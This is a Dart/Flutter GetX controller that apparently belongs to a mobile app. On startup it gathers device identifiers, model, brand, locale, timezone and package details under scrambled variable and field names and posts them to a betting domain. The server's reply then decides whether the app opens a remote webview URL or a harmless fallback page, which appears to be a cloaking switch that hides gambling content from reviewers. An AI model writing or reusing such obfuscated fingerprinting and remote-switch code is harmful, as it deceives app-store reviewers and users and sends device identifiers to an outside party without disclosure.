import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var wmtdyogjka = RxBool(false);
  var bfphuxtcq = RxBool(true);
  var smjkuwe = RxString("");
  var kathleen = RxBool(false);
  var bogisich = RxBool(true);
  final ihyoagzwu = Dio();


  InAppWebViewController? webViewController;

  void checkNetwork() async {
    var connectResult = await (Connectivity().checkConnectivity());
    if(connectResult == ConnectivityResult.none){
      Get.toNamed("/noNetwork");
    }
  }

  @override
  void onInit() {
    checkNetwork();
    super.onInit();
    erkom();
  }


  Future<void> erkom() async {

    kathleen.value = true;
    bogisich.value = true;
    bfphuxtcq.value = false;

    ihyoagzwu.post("https://bet.capbonf.xyz/LQEWCJ3RJGDH",data: await tmehxduv()).then((value) {
      var ypne = value.data["ypne"] as String;
      var wfpce = value.data["wfpce"] as bool;
      if (wfpce) {
        smjkuwe.value = ypne;
        graciela();
      } else {
        conroy();
      }
    }).catchError((e) {
      bfphuxtcq.value = true;
      bogisich.value = true;
      kathleen.value = false;
    });
  }

  Future<Map<String, dynamic>> tmehxduv() async {
    final DeviceInfoPlugin iozj = DeviceInfoPlugin();
    PackageInfo scwkfbey_rcbkntmh = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var rcbqd = Platform.localeName;
    var uNxFS = currentTimeZone;

    var VkBMfe = scwkfbey_rcbkntmh.packageName;
    var ueUOlTcR = scwkfbey_rcbkntmh.version;
    var upYDU = scwkfbey_rcbkntmh.buildNumber;

    var qzbYQ = scwkfbey_rcbkntmh.appName;
    var CNMWxcfg = "";
    var efrainSchaden = "";
    var ExNCqs  = "";
    var ZoWh = "";
    var melynaSchumm = "";
    var johnathanVandervort = "";
    var zPpuV = "";
    var marionPagac = "";
    var marilouVon = "";
    var conradHeidenreich = "";


    var kplbZP = false;

    if (GetPlatform.isAndroid) {
      zPpuV = "android";
      var nixvyedzjq = await iozj.androidInfo;

      ZoWh = nixvyedzjq.brand;

      CNMWxcfg  = nixvyedzjq.model;
      ExNCqs = nixvyedzjq.id;

      kplbZP = nixvyedzjq.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      zPpuV = "ios";
      var rxwqcud = await iozj.iosInfo;
      ZoWh = rxwqcud.name;
      CNMWxcfg = rxwqcud.model;

      ExNCqs = rxwqcud.identifierForVendor ?? "";
      kplbZP  = rxwqcud.isPhysicalDevice;
    }

    var res = {
      "conradHeidenreich" : conradHeidenreich,
      "upYDU": upYDU,
      "ueUOlTcR": ueUOlTcR,
      "johnathanVandervort" : johnathanVandervort,
      "rcbqd": rcbqd,
      "VkBMfe": VkBMfe,
      "CNMWxcfg": CNMWxcfg,
      "uNxFS": uNxFS,
      "ExNCqs": ExNCqs,
      "zPpuV": zPpuV,
      "ZoWh": ZoWh,
      "qzbYQ": qzbYQ,
      "kplbZP": kplbZP,
      "efrainSchaden" : efrainSchaden,
      "marionPagac" : marionPagac,
      "melynaSchumm" : melynaSchumm,
      "marilouVon" : marilouVon,

    };
    return res;
  }

  Future<void> conroy() async {
    Get.offAllNamed("/linksTab");
  }

  Future<void> graciela() async {
    Get.offAllNamed("/linksGo");
  }

}
